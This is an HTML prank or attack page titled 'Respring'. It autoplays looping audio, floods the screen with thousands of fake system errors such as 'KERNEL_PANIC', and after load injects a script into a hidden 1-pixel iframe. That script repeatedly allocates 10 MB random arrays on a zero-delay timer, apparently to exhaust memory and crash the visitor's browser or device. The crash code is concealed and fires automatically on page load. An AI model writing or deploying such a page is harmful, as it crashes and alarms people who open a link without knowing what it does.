<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Respring</title>
    <style>
        body {
            background: #8b0000;
            color: #ffffff;
            margin: 0;
            padding: 0;
            overflow: hidden;
            font-family: 'JetBrains Mono', monospace;
            display: flex;
            flex-wrap: wrap;
            gap: 4px;
            align-content: flex-start;
            height: 100vh;
            width: 100vw;
        }

        .error-msg {
            font-size: 6px;
            opacity: 0.6;
            white-space: nowrap;
            user-select: none;
            padding: 1px;
        }

        #respring-iframe {
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
            z-index: -1;
        }
    </style>
</head>
<body>

<iframe id="respring-iframe"
sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>

<script>
    // ===== WEB AUDIO =====
    const audioUrl = "https://raw.githubusercontent.com/VityaIG/vityaig.github.io/main/otkat.mp3";

    let audioCtx;
    let buffer;
    let source;

    async function initAudio() {
        if (!audioCtx) {
            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        }

        if (!buffer) {
            const res = await fetch(audioUrl);
            const arrayBuffer = await res.arrayBuffer();
            buffer = await audioCtx.decodeAudioData(arrayBuffer);
        }
    }

    function playAudio() {
        if (!buffer || !audioCtx) return;

        source = audioCtx.createBufferSource();
        source.buffer = buffer;
        source.loop = true;

        const gainNode = audioCtx.createGain();
        gainNode.gain.value = 1.0;

        source.connect(gainNode).connect(audioCtx.destination);
        source.start(0);
    }

    async function startAudio() {
        try {
            await initAudio();

            if (audioCtx.state === "suspended") {
                await audioCtx.resume();
            }

            playAudio();
        } catch (e) {}
    }

    // попытка автозапуска (~100мс)
    window.addEventListener("load", () => {
        setTimeout(startAudio, 100);
    });

    // гарантированный запуск по действию
    function unlock() {
        startAudio();

        document.removeEventListener("click", unlock);
        document.removeEventListener("touchstart", unlock);
        document.removeEventListener("keydown", unlock);
    }

    document.addEventListener("click", unlock);
    document.addEventListener("touchstart", unlock);
    document.addEventListener("keydown", unlock);


    // ===== СПАМ ОШИБКАМИ =====
    const errors = [
        "Fatal Error 0x3333",
        "Entering Bootloop...",
        "KERNEL_PANIC",
        "OVERFLOW_DETECTION",
        "STACK_COLLISION",
        "MEMORY_CORRUPTION",
        "0xFFFF_SYSTEM_HALT"
    ];

    for (let i = 0; i < 3000; i++) {
        let span = document.createElement("span");
        span.className = "error-msg";
        span.innerText = errors[Math.floor(Math.random() * errors.length)];
        document.body.appendChild(span);
    }


    // ===== IFRAME БЕЗ ЗАДЕРЖКИ =====
    window.addEventListener("load", () => {
        setTimeout(() => {
            const frame = document.getElementById("respring-iframe");

            frame.srcdoc = `
                <html><body style="margin:0">
                <script>
                    setInterval(() => {
                        let x = new Uint8Array(1024 * 1024 * 10);
                        crypto.getRandomValues(x);
                    }, 0);
                <\/script>
                </body></html>
            `;
        }, 750);
    });

</script>

</body>
</html>
